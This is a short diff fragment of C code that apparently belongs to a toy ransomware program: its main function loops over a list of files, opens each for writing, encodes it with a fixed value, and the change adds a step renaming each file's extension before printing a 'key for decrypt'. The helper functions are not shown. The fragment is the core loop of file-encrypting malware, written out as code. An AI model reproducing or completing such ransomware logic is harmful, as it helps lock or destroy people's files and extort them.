@@ -30,7 +30,9 @@ int main(int argc, char *argv[]) {
     for (int i = 0; allfiles != NULL && allfiles[i] != NULL; ++i) {
         FILE *file = fopen(allfiles[i], "r+");
         encodeFile(file, 42);
+        changeExtension(allfiles[i]);
         free(allfiles[i]); 
+        
     }
     char *key = get_key(15);
     printf("key for decrypt : %s", key);
